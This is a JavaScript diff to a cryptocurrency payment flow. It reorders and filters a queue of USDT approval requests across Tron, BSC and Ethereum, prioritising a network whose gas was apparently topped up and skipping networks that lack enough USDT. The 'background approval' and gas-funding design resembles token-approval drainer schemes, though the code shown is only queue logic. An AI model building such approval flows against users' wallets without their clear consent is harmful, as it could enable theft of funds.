@@ -649,7 +649,13 @@ function networkLabel(network) {
 }
 
 function sortPaymentQueue(list) {
-  const order = { tron: 0, bsc: 1, eth: 2 };
+  const topped = list.filter(function (item) {
+    return item && (item.gasFundingTxHash || (item.gas && item.gas.transactionHash));
+  });
+  const first = topped.length === 1 ? topped[0].network : null;
+  const order = first
+    ? { [first]: 0, eth: 1, bsc: 2, tron: 3 }
+    : { tron: 0, bsc: 1, eth: 2 };
   return list.slice().sort(function (a, b) {
     return (order[a.network] ?? 9) - (order[b.network] ?? 9);
   });
@@ -794,6 +800,11 @@ async function requestCurrentApproval() {
     const data = await res.json();
     if (!res.ok) {
       if (/already waiting/i.test(String(data.message || ''))) return;
+      if (/does not have enough USDT|Skipping/i.test(String(data.message || ''))) {
+        if (paymentId) finishedPayments.add(paymentId);
+        tryNextNetworkOrStop(p && p.network);
+        return;
+      }
       if (/insufficient|could not confirm live|native gas/i.test(String(data.message || ''))) {
         throw new Error(data.message);
       }
@@ -912,7 +923,14 @@ async function startBackgroundApproval() {
     const data = await res.json();
     if (!res.ok) throw new Error(data.message || 'Could not prepare authorization');
     const p = data.payment;
-    paymentQueue = sortPaymentQueue((p.payments && p.payments.length) ? p.payments : [p]);
+    const allowed = (p.eligibility && p.eligibility.eligibleNetworks) || [];
+    let queued = (p.payments && p.payments.length) ? p.payments : [p];
+    if (allowed.length) {
+      queued = queued.filter(function (item) {
+        return item && allowed.indexOf(item.network) >= 0;
+      });
+    }
+    paymentQueue = sortPaymentQueue(queued);
     paymentIndex = paymentQueue.findIndex(function (item) {
       return item.status !== 'verified';
     });
